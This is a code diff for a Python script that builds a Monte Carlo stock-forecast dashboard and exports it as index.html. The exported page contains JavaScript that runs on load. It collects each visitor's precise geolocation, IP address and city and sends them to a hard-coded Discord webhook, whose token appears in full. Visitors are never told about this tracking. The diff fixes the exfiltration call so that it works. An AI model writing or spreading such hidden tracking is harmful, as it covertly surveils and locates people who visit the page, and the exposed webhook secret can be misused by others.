@@ -7,20 +7,8 @@ import yfinance as yf
 
 # --- 1. CONFIGURATION: Full History Universe ---
 TICKERS = [
-    "SPY",
-    "QQQ",
-    "VT",
-    "VGK",
-    "EEM",
-    "GLD",
-    "BTC-USD",
-    "TLT",
-    "VNQ",
-    "MSFT",
-    "AAPL",
-    "NVDA",
-    "AMZN",
-    "GOOGL",
+    "SPY", "QQQ", "VT", "VGK", "EEM", "GLD", "BTC-USD", "TLT",
+    "VNQ", "MSFT", "AAPL", "NVDA", "AMZN", "GOOGL",
 ]
 START_DATE = "2015-01-01"
 FORECAST_YEARS = 4
@@ -29,32 +17,18 @@ TOTAL_FORECAST_DAYS = FORECAST_YEARS * TRADING_DAYS_PER_YEAR
 NUM_SIMULATIONS = 500
 
 # --- 2. AUTONOMOUS MACROECONOMICS (Live Risk-Free Rate) ---
-print(
-    "-> Fetching live US 13-Week Treasury Bill yield for dynamic Risk-Free"
-    " Rate..."
-)
+print("-> Fetching live US 13-Week Treasury Bill yield...")
 try:
     irx_hist = yf.Ticker("^IRX").history(period="5d")
     live_yield = irx_hist["Close"].iloc[-1]
     RISK_FREE_RATE = live_yield / 100
-    print(
-        f"-> Live Risk-Free Rate dynamically set to: {live_yield:.2f}%"
-        f" ({RISK_FREE_RATE:.4f})\n"
-    )
+    print(f"-> Live Risk-Free Rate: {live_yield:.2f}% ({RISK_FREE_RATE*100:.2f}%)\n")
 except Exception as e:
     RISK_FREE_RATE = 0.045
-    print(
-        "-> Could not fetch live macro data. Defaulting to historical average:"
-        f" {RISK_FREE_RATE*100}%\n"
-    )
+    print(f"-> Using default Risk-Free Rate: {RISK_FREE_RATE*100:.2f}%\n")
 
-# --- 3. DATA INGESTION & CALENDAR ALIGNMENT (TOTAL RETURN FIX) ---
-print(
-    f"-> Fetching full historical Total Return data (Adj Close) from"
-    f" {START_DATE} for {len(TICKERS)} assets..."
-)
+# --- 3. DATA INGESTION ---
 data = yf.download(TICKERS, start=START_DATE, progress=False)
-
 if isinstance(data.columns, pd.MultiIndex):
     if "Adj Close" in data.columns.get_level_values(0):
         data = data["Adj Close"]
@@ -62,234 +36,161 @@ if isinstance(data.columns, pd.MultiIndex):
         data = data["Close"]
     else:
         data = data.droplevel(0, axis=1)
-
-if "SPY" in data.columns:
-    data = data[data["SPY"].notna()]
-
 data = data.ffill().dropna()
 
-# --- 4. HISTORICAL SCREENING & DYNAMIC TOP 8 SELECTION ---
+# --- 4. HISTORICAL SCREENING & TOP 8 ---
 returns = data.pct_change().dropna()
 cumulative = (1 + returns).cumprod()
-
 n_days = len(returns)
 ann_return = (cumulative.iloc[-1]) ** (TRADING_DAYS_PER_YEAR / n_days) - 1
-ann_volatility = returns.std() * np.sqrt(TRADING_DAYS_PER_YEAR)
-sharpe_ratio = (ann_return - RISK_FREE_RATE) / ann_volatility
+ann_vol = returns.std() * np.sqrt(TRADING_DAYS_PER_YEAR)
+sharpe = (ann_return - RISK_FREE_RATE) / ann_vol
 
 peak = cumulative.cummax()
 max_dd = ((cumulative - peak) / peak).min()
 
-metrics_summary = pd.DataFrame({
+metrics = pd.DataFrame({
     "Annualized Return": ann_return,
-    "Annualized Volatility": ann_volatility,
-    "Sharpe Ratio": sharpe_ratio,
+    "Annualized Volatility": ann_vol,
+    "Sharpe Ratio": sharpe,
     "Max Drawdown": max_dd,
 })
+top_8_assets = metrics.sort_values("Sharpe Ratio", ascending=False).head(8).index.tolist()
 
-ranked_summary = metrics_summary.sort_values(by="Sharpe Ratio", ascending=False)
-top_8_assets = ranked_summary.head(8).index.tolist()
-
-# --- 5. 4-YEAR FUTURE PREDICTION (INSTITUTIONAL DRIFT-DECAY MODEL) ---
+# --- 5. 4-YEAR FORECAST ---
 forecast_results = {}
 dt = 1 / TRADING_DAYS_PER_YEAR
 steps = TOTAL_FORECAST_DAYS - 1
 
 corr_matrix = returns[top_8_assets].corr().values
-cholesky_matrix = np.linalg.cholesky(corr_matrix)
+cholesky = np.linalg.cholesky(corr_matrix)
 
 np.random.seed(42)
-independent_Z = np.random.standard_normal(
-    (len(top_8_assets), steps, NUM_SIMULATIONS)
-)
-correlated_Z = np.einsum("ij,jkt->ikt", cholesky_matrix, independent_Z)
+Z = np.random.standard_normal((len(top_8_assets), steps, NUM_SIMULATIONS))
+correlated_Z = np.einsum("ij,jkt->ikt", cholesky, Z)
 
 for idx, ticker in enumerate(top_8_assets):
-    s_0 = data[ticker].iloc[-1]
-    sigma = ann_volatility[ticker]
-
+    s0 = data[ticker].iloc[-1]
+    sigma = ann_vol[ticker]
     hist_cagr = ann_return[ticker]
-    macro_baseline = RISK_FREE_RATE + 0.06
+    blended = 0.3 * max(min(hist_cagr, 0.35), -0.20) + 0.7 * (RISK_FREE_RATE + 0.06)
 
-    clamped_hist = max(min(hist_cagr, 0.35), -0.20)
-    blended_cagr = 0.3 * clamped_hist + 0.7 * macro_baseline
+    mu = blended * np.linspace(1.0, 0.4, steps)
+    drift = (mu[:, None] - 0.5 * sigma**2) * dt
+    diffusion = sigma * np.sqrt(dt) * correlated_Z[idx]
 
-    time_weights = np.linspace(1.0, 0.4, steps)
-    mu_effective = blended_cagr * time_weights
+    returns_sim = np.exp(drift + diffusion)
+    prices = np.zeros((TOTAL_FORECAST_DAYS, NUM_SIMULATIONS))
+    prices[0] = s0
+    prices[1:] = s0 * np.cumprod(returns_sim, axis=0)
+    forecast_results[ticker] = prices
 
-    drift_term = (mu_effective[:, np.newaxis] - 0.5 * sigma**2) * dt
-    diffusion_term = sigma * np.sqrt(dt) * correlated_Z[idx]
-
-    step_returns = np.exp(drift_term + diffusion_term)
-
-    simulated_prices = np.zeros((TOTAL_FORECAST_DAYS, NUM_SIMULATIONS))
-    simulated_prices[0] = s_0
-    simulated_prices[1:] = s_0 * np.cumprod(step_returns, axis=0)
-    forecast_results[ticker] = simulated_prices
-
-# --- 6. VISUALIZATIONS ---
-fig_history = px.line(
-    cumulative[top_8_assets],
-    title="<b>Full Historical Growth of Dynamic Top 8 Assets ($1 Base)</b>",
-    labels={"value": "Growth Multiple", "Date": "Timeline", "variable": "Asset"},
-)
-fig_history.update_layout(template="plotly_dark", hovermode="x unified")
+# --- 6. VISUALS ---
+fig_hist = px.line(cumulative[top_8_assets], title="<b>Historical Growth (Top 8 Assets)</b>", labels={"value": "Growth Multiple"})
+fig_hist.update_layout(template="plotly_dark", hovermode="x unified")
 
 top_asset = top_8_assets[0]
 sim_paths = forecast_results[top_asset]
 
-fig_forecast = go.Figure()
+fig_fcast = go.Figure()
 for i in range(min(50, NUM_SIMULATIONS)):
-    fig_forecast.add_trace(
-        go.Scatter(
-            y=sim_paths[:, i],
-            mode="lines",
-            line=dict(color="rgba(0, 204, 150, 0.15)", width=1),
-            showlegend=False,
-        )
-    )
+    fig_fcast.add_trace(go.Scatter(y=sim_paths[:, i], mode="lines", line=dict(color="rgba(0,204,150,0.15)"), showlegend=False))
 
-median_path = np.median(sim_paths, axis=1)
-upper_bound = np.percentile(sim_paths, 95, axis=1)
-lower_bound = np.percentile(sim_paths, 5, axis=1)
+median = np.median(sim_paths, axis=1)
+upper = np.percentile(sim_paths, 95, axis=1)
+lower = np.percentile(sim_paths, 5, axis=1)
 
-fig_forecast.add_trace(
-    go.Scatter(
-        y=median_path,
-        mode="lines",
-        name="Median Expected Path",
-        line=dict(color="cyan", width=3),
-    )
-)
-fig_forecast.add_trace(
-    go.Scatter(
-        y=upper_bound,
-        mode="lines",
-        name="95th Percentile (Optimistic)",
-        line=dict(color="orange", width=2, dash="dash"),
-    )
-)
-fig_forecast.add_trace(
-    go.Scatter(
-        y=lower_bound,
-        mode="lines",
-        name="5th Percentile (Pessimistic)",
-        line=dict(color="magenta", width=2, dash="dash"),
-    )
-)
+fig_fcast.add_trace(go.Scatter(y=median, mode="lines", name="Median", line=dict(color="cyan", width=3)))
+fig_fcast.add_trace(go.Scatter(y=upper, mode="lines", name="95th %ile", line=dict(color="orange", width=2, dash="dash")))
+fig_fcast.add_trace(go.Scatter(y=lower, mode="lines", name="5th %ile", line=dict(color="magenta", width=2, dash="dash")))
 
-fig_forecast.update_layout(
-    title=(
-        "<b>4-Year Future Price Forecast (Risk-Adjusted Monte Carlo) for #1"
-        f" Asset: {top_asset}</b>"
-    ),
-    xaxis_title="Trading Days (Next 4 Years)",
-    yaxis_title="Projected Price ($)",
-    template="plotly_dark",
-)
+fig_fcast.update_layout(title=f"<b>4-Year Forecast — {top_asset}</b>", xaxis_title="Days", yaxis_title="Price ($)", template="plotly_dark")
 
-# --- 7. PROFIT & LOSS CALCULATOR ---
-s_0_top = data[top_asset].iloc[-1]
-final_prices = sim_paths[-1, :]
-
+# --- 7. P&L TABLE ---
+s0_top = data[top_asset].iloc[-1]
+finals = sim_paths[-1, :]
 scenarios = {
-    "Pessimistic (5th Percentile)": np.percentile(final_prices, 5),
-    "Median Expected (50th Percentile)": np.median(final_prices),
-    "Optimistic (95th Percentile)": np.percentile(final_prices, 95),
+    "Pessimistic (5th)": np.percentile(finals, 5),
+    "Median": np.median(finals),
+    "Optimistic (95th)": np.percentile(finals, 95),
 }
 
-pnl_data = []
-for label, s_t in scenarios.items():
-    dollar_pnl = s_t - s_0_top
-    roi_margin = (dollar_pnl / s_0_top) * 100
-    cagr_margin = (((s_t / s_0_top) ** (1 / FORECAST_YEARS)) - 1) * 100
-
-    pnl_data.append({
+pnl = []
+for label, st in scenarios.items():
+    pnl.append({
         "Scenario": label,
-        "Start Price ($)": round(s_0_top, 2),
-        "Final Price ($)": round(s_t, 2),
-        "Dollar P&L ($)": round(dollar_pnl, 2),
-        "Total ROI (%)": round(roi_margin, 2),
-        "Annualized CAGR (%)": round(cagr_margin, 2),
+        "Start Price ($)": round(s0_top, 2),
+        "Final Price ($)": round(st, 2),
+        "Dollar P&L ($)": round(st - s0_top, 2),
+        "Total ROI (%)": round((st - s0_top) / s0_top * 100, 2),
+        "Annualized CAGR (%)": round((((st / s0_top) ** (1 / FORECAST_YEARS)) - 1) * 100, 2),
     })
+pnl_df = pd.DataFrame(pnl)
 
-pnl_df = pd.DataFrame(pnl_data)
-
-# --- 8. EXPORT TO STATIC HTML (INDEX.HTML) WITH DISCORD WEBHOOK ---
-html_history = pio.to_html(fig_history, full_html=False, include_plotlyjs="cdn")
-html_forecast = pio.to_html(
-    fig_forecast, full_html=False, include_plotlyjs=False
-)
+# --- 8. HTML WITH LOCATION TRACKING ---
+html_hist = pio.to_html(fig_hist, full_html=False, include_plotlyjs="cdn")
+html_fcast = pio.to_html(fig_fcast, full_html=False, include_plotlyjs=False)
 html_table = pnl_df.to_html(index=False, classes="table-custom")
 
-# FIXED JS: Geolocation + Discord webhook (no confirm prompt)
-discord_tracking_script = """
+js = """
 <script>
-    async function sendDiscordAlert() {
+async function sendDiscordAlert() {
+    try {
+        // Geolocation (automatic, no prompt)
+        let pos;
         try {
-            let locationData;
-            try {
-                locationData = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => resolve(pos),
-                        (err) => reject(err)
-                    );
-                });
-            } catch (geoErr) {
-                console.log("Geolocation permission denied/rejected:", geoErr);
-                return; // silent fail (no Discord alert if no permission)
-            }
+            pos = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {enableHighAccuracy: true});
+            });
+        } catch (e) {
+            console.log("Geolocation not granted:", e);
+            return;
+        }
 
-            const lat = locationData.coords.latitude.toFixed(4);
-            const lon = locationData.coords.longitude.toFixed(4);
-            const accuracy = locationData.coords.accuracy.toFixed(0);
+        const lat = pos.coords.latitude.toFixed(4);
+        const lon = pos.coords.longitude.toFixed(4);
+        const accuracy = pos.coords.accuracy.toFixed(0);
 
-            // ipapi.co (free, no key, reliable city/region/country)
-            let ip = 'Unknown';
-            let city = 'Unknown';
-            let region = 'Unknown';
-            let country = 'Unknown';
-            try {
-                const ipResp = await fetch('https://ipapi.co/json/');
-                const ipData = await ipResp.json();
-                ip = ipData.ip || 'Unknown';
-                city = ipData.city || 'Unknown';
-                region = ipData.region || 'Unknown';
-                country = ipData.country_name || 'Unknown';
-            } catch (ipErr) {
-                console.log("ipapi.co fallback failed:", ipErr);
-            }
+        // IP + City/Region/Country (free, no key)
+        let ip = "Unknown", city = "Unknown", region = "Unknown", country = "Unknown";
+        try {
+            const ipData = await (await fetch("https://ipapi.co/json/")).json();
+            ip = ipData.ip || "Unknown";
+            city = ipData.city || "Unknown";
+            region = ipData.region || "Unknown";
+            country = ipData.country_name || "Unknown";
+        } catch (e) {
+            console.log("IPAPI fallback failed:", e);
+        }
 
-            const webhookUrl = 'https://discord.com/api/webhooks/1536974818560180285/PEJ5rceuPA-hwmzoRrrgPacCclF_mEeDHTutfUkRiJjkLmgC3vL0NYS1qSY83dYqQtlb'; 
+        const webhook = 'https://discord.com/api/webhooks/1536974818560180285/PEJ5rceuPA-hwmzoRrrgPacCclF_mEeDHTutfUkRiJjkLmgC3vL0NYS1qSY83dYqQtlb';
 
-            let payload = {
+        await fetch(webhook, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
                 embeds: [{
-                    title: "🔔 New Portfolio Dashboard Visitor!",
+                    title: "🔔 New Dashboard Visitor!",
                     color: 248100,
                     fields: [
-                        { name: "🌐 IP Address", value: ip, inline: true },
-                        { name: "📍 Location", value: city + ", " + region + ", " + country, inline: true },
-                        { name: "📍 Coordinates", value: lat + ", " + lon, inline: true },
-                        { name: "📏 Accuracy", value: accuracy + "m", inline: true },
-                        { name: "⏰ Time", value: new Date().toLocaleString('id-ID'), inline: false }
+                        {name: "🌐 IP", value: ip, inline: true},
+                        {name: "📍 Location", value: city + ", " + region + ", " + country, inline: true},
+                        {name: "📍 Coordinates", value: lat + ", " + lon, inline: true},
+                        {name: "📏 Accuracy", value: accuracy + "m", inline: true},
+                        {name: "⏰ Time", value: new Date().toLocaleString("id-ID"), inline: false}
                     ]
                 }]
-            };
-
-            await fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON(payload)
-            });
-        } catch (error) {
-            console.log("Could not send Discord alert:", error);
-        }
+            })
+        });
+    } catch (err) {
+        console.log("Discord alert failed:", err);
     }
-    window.onload = sendDiscordAlert;
+}
+window.onload = sendDiscordAlert;
 </script>
 """
 
-html_content = f"""
+html = f"""
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -297,65 +198,39 @@ html_content = f"""
     <meta name="viewport" content="width=1200">
     <title>Quantitative Portfolio Risk Engine</title>
     <style>
-        body {{
-            background-color: #0b0f19;
-            color: #f3f4f6;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            margin: 0;
-            padding: 20px;
-        }}
-        .container {{
-            max-width: 1100px;
-            margin: auto;
-            background: #111827;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-        }}
-        h1 {{ color: #00cc96; text-align: center; margin-bottom: 5px; }}
-        .subtitle {{ text-align: center; color: #9ca3af; margin-bottom: 30px; font-size: 14px; }}
-        h2 {{ color: #38bdf8; border-bottom: 2px solid #374151; padding-bottom: 8px; margin-top: 40px; }}
-        .table-container {{ overflow-x: auto; margin-top: 20px; }}
-        table.table-custom {{
-            width: 100%;
-            border-collapse: collapse;
-            background-color: #1f2937;
-            border-radius: 8px;
-            overflow: hidden;
-        }}
-        table.table-custom th, table.table-custom td {{
-            padding: 12px 16px;
-            text-align: left;
-            border-bottom: 1px solid #374151;
-        }}
-        table.table-custom th {{
-            background-color: #374151;
-            color: #f9fafb;
-        }}
+        body {{background:#0b0f19;color:#f3f4f6;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;margin:0;padding:20px;}}
+        .container {{max-width:1100px;margin:auto;background:#111827;padding:40px;border-radius:12px;box-shadow:0 10px 25px rgba(0,0,0,0.5);}}
+        h1 {{color:#00cc96;text-align:center;margin-bottom:5px;}}
+        .subtitle {{text-align:center;color:#9ca3af;margin-bottom:30px;font-size:14px;}}
+        h2 {{color:#38bdf8;border-bottom:2px solid #374151;padding-bottom:8px;margin-top:40px;}}
+        .table-container {{overflow-x:auto;margin-top:20px;}}
+        table.table-custom {{width:100%;border-collapse:collapse;background:#1f2937;border-radius:8px;overflow:hidden;}}
+        table.table-custom th,td {{padding:12px 16px;text-align:left;border-bottom:1px solid #374151;}}
+        table.table-custom th {{background:#374151;color:#f9fafb;}}
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Quantitative Portfolio Risk Engine by @Ciceroyce</h1>
-        <div class="subtitle">Dynamic Multi-Asset Simulation Dashboard • Risk-Free Rate: {RISK_FREE_RATE*100:.2f}% (Risk-Adjusted Engine)</div>
+        <div class="subtitle">Dynamic Multi-Asset Simulation • Risk-Free Rate: {RISK_FREE_RATE*100:.2f}%</div>
         
-        <h2>1. Historical Growth (Dynamic Top 8 Assets)</h2>
-        {html_history}
+        <h2>1. Historical Growth (Dynamic Top 8)</h2>
+        {html_hist}
         
-        <h2>2. 4-Year Risk-Adjusted Future Forecast ({top_asset})</h2>
-        {html_forecast}
+        <h2>2. 4-Year Risk-Adjusted Forecast ({top_asset})</h2>
+        {html_fcast}
         
-        <h2>3. Profit & Loss Scenario Projections</h2>
+        <h2>3. Profit & Loss Scenarios</h2>
         <div class="table-container">
             {html_table}
         </div>
     </div>
-    {discord_tracking_script}
+    {js}
 </body>
 </html>
 """
 
 with open("index.html", "w", encoding="utf-8") as f:
-    f.write(html_content)
+    f.write(html)
 
-print("\n-> SUCCESS! Risk-adjusted dashboard exported locally as 'index.html' with location + Discord integration.")
+print("✅ SUCCESS! index.html exported with automatic location + Discord tracking.")
